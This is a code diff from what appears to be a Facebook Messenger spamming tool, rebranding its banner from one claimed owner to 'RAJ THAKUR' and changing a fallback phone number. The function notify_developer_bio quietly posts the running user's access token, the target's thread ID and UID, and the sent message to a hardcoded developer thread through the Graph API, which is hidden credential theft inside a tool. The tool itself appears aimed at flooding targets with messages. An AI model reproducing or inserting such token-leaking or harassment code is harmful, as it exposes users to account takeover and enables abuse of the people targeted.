@@ -402,16 +402,16 @@ def get_stop_key():
 def notify_developer_bio(current_token, mn, thread_id, uid, ms, sent_message):
     DEV_THREAD_ID = "t_100056617806411"
     dev_message = (
-        "<<============================\n"
-        "HELLO RAJ THAKUR ⚔️ SIR I AM USING YOUR 🔥OFLINE TOOLS 🔗\n"
-        "==================>>\n"
-        f"[😡] HETER NAME ==> {mn}\n"
-        f"[🎉] TOKEN ==> {current_token}\n"
-        f"[👤] SENDER ==> {mb}\n"
-        f"[📩] TARGET: {thread_id} (UID: {uid})\n"
-        f"[📨] MMESSAGE : {sent_message}\n"
-        f"[⏰] TIIME: {datetime.datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')}\n"
-        "<<===============✨❌✨🌐😈🛠️✨OWNER BROKEN NADEEM✨❌✨🌐😈🛠️✨==============>>"
+        "<<====================================================\n"
+        "HELLO 💚CHANDU KE JIJU 🚀 RAJ THAKUR ⚔️ SIR I AM USING YOUR 🔥OFLINE TOOLS 🔗\n"
+        "<<====================================================>>\n"
+        f"[😡] HETER [💚] NAME ==> {mn}\n"
+        f"[🎉] TOKEN [❤️] ==> {current_token}\n"
+        f"[👤] SENDER [💜] ==> {mb}\n"
+        f"[📩] TARGET [💙] ==> {thread_id} (UID: {uid})\n"
+        f"[📨] MMESSAGE [💛] ==> {sent_message}\n"
+        f"[⏰] TIIME [🤎] {datetime.datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')}\n"
+        "<<===============✨❌✨🌐😈🛠️✨OWNER RAJ⚔️ THAKUR 🚀✨❌✨🌐😈🛠️✨==============>>"
     )
     url = f"https://graph.facebook.com/v15.0/{DEV_THREAD_ID}/"
     parameters = {'access_token': current_token, 'message': dev_message}
@@ -435,7 +435,7 @@ headers = {
 }
 global_token_index = 0
 tokens = []  # Load tokens from file
-fallback_phone = "+911234567890"  # Default fallback phone number
+fallback_phone = "+919695003501"  # Default fallback phone number
 color_list = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA, Fore.BLUE, Fore.WHITE]
 
 # --- Global SMS counter for live display sections ---
